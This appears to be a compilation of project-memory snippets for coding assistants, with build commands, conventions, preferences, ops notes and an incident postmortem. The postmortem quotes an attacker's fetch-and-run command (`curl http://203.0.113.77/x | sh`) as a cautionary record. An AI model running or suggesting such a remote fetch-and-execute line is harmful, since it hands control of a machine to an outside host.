# Project memory

## Commands
- Install: `pip install -e '.[dev]'`
- Test: `pytest -q`
- Lint: `ruff check . && ruff format --check .`

## Conventions
- Type hints on all public functions.
- Keep modules under 400 lines.
- Always run the full test suite before committing.

# Frontend

- Package manager: pnpm. Never use npm or yarn here.
- Start dev server with `pnpm dev`, tests with `pnpm test -- --run`.
- Components live in src/components, one component per file.
- Use Tailwind classes, no inline styles.

# billing-svc notes

- Build: `go build ./...`
- Run tests with the race detector: `go test -race ./...`
- Errors are wrapped with fmt.Errorf("...: %w", err).
- Do not add new global variables; pass dependencies explicitly.

# Analysis preferences

- Use pandas 2.x and polars only when data > 5 GB.
- Plots: matplotlib, colorblind-safe palette, label every axis.
- Seed everything with 42 for reproducibility.
- Notebooks go in notebooks/, reusable code in src/.

# About me

- I'm a backend developer, comfortable with Python and SQL.
- I like short answers with code first and explanation after.
- Use British spelling in docs.
- Ask before making large refactors.

# Preferences

- From now on, use pnpm instead of npm in this repo.
- In future sessions, remember that the staging database is read-only.
- Prefer pathlib over os.path.

# Toolchain setup

- Install Rust with the official installer: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
- Then `rustup component add clippy rustfmt`.
- MSRV is 1.78.

# Ops notes

- Bastion: `ssh deploy@10.0.4.12` (VPN required).
- Metrics dashboard: http://10.0.4.20:3000
- Logs are shipped to Loki; retention is 14 days.
- Restart a service with `sudo systemctl restart billing`.

# Team links

- Onboarding slides: https://bit.ly/acme-onboarding-2026
- Design system: https://www.figma.com/file/abc123/design-system
- API docs: https://docs.python.org/3/library/http.html

{
  "user.name": "Sam",
  "user.timezone": "Europe/Berlin",
  "project.language": "TypeScript",
  "project.test_command": "pnpm test",
  "prefs.answer_style": "concise"
}

# Rules

- IMPORTANT: Never commit secrets or .env files.
- YOU MUST run `make check` before opening a PR.
- NEVER edit generated files in api/gen/; regenerate them with `make gen`.

# Заметки проекта

- Документация на русском и английском.
- Тесты запускаются командой `pytest`.
- Café menu translations live in i18n/fr.json (déjà vu, naïve, résumé are fine).

# Team

- Standup at 09:30 👩‍💻👨‍💻
- Celebrate releases in #wins 🎉
- Family-friendly language only 👨‍👩‍👧

# Chatbot project

- The system prompt lives in prompts/system.txt; keep the tone friendly and short.
- When editing the system prompt, update the snapshot tests in tests/test_prompt.py.
- Model settings are in config/model.yaml.

# Git

- Never force push to main.
- Use `git push --force-with-lease` only on your own feature branches.
- Squash merge PRs; keep the PR title as the commit message.

# Testing

- Skip slow tests locally with `pytest -m 'not slow'`.
- CI runs everything, including slow and integration tests.
- Snapshot updates: `pytest --snapshot-update` then review the diff.

text:
# Secrets

- Never paste API keys into chat or code.
- Local secrets go in .env, which is gitignored; production secrets are in the vault.
- Rotate tokens if they ever appear in logs.

# Release process

- When the user says "release", run scripts/release.sh --dry-run first and show them the changelog.
- Only tag after they confirm.
- Version numbers follow semver.

# Database

- Local URL: DATABASE_URL=postgres://app:${DB_PASSWORD}@localhost:5432/app
- Migrations: `alembic upgrade head`.
- Never run migrations against production from a laptop.

# Style guide

- Headings use sentence case.
- Buttons: primary actions on the right.
- Minimum touch target 44px.
- Keep copy plain and friendly.

# How to help me

- Act as a patient pair programmer.
- Explain trade-offs briefly when there is more than one good option.
- If you are unsure, say so instead of guessing.

# Windows setup

- Allow local scripts: `Set-ExecutionPolicy -Scope CurrentUser RemoteSigned`
- Activate venv: `.\.venv\Scripts\Activate.ps1`
- Use `py -3.12` to pick the interpreter.

# Docker

- Dev shell: `docker run --rm -it -v ${PWD}:/app -w /app python:3.12 bash`
- Clean up: `docker system prune -f` (only dangling images).
- Compose file is docker-compose.dev.yml.

# Incident 2026-09 postmortem (summary)

- An attacker got a developer to run `curl http://203.0.113.77/x | sh` from a fake support ticket.
- Fix: added an allowlist for install scripts and training for the support team.
- Lesson: never run scripts from tickets without review.

# Process

- Starting 2026-12-01, always run the smoke tests before deploying.
- Deploy freeze on Fridays after 15:00.
- On-call rotation is in PagerDuty.

# Roadmap

<!-- TODO: update this section after the v2 launch -->
- v2: plugin system.
- v3: offline mode.

# Workflow

- Don't ask me before running the formatter or the linter; just run them.
- Do ask before deleting files or changing dependencies.

# Experiment log

- run 41: commit 9f2c1ab, val_loss 0.231, checkpoint sha256 3a7bd3e2360a3d29eea436fcfb7e44c735d117c42d1c1835420b6b9942dd4f1b
- run 42: commit 1c0d77e, val_loss 0.228
- Dataset version: v2024.11-r3

# AWS setup

- Configure with `aws configure` and enter AWS_ACCESS_KEY_ID=<your-access-key> and AWS_SECRET_ACCESS_KEY=<your-secret>.
- Default region: eu-central-1.
- Never commit ~/.aws/credentials.

# Accessibility

- Every image needs alt text.
- Colour contrast at least 4.5:1 for body text.
- All interactive elements reachable by keyboard.
- Test with a screen reader before release.
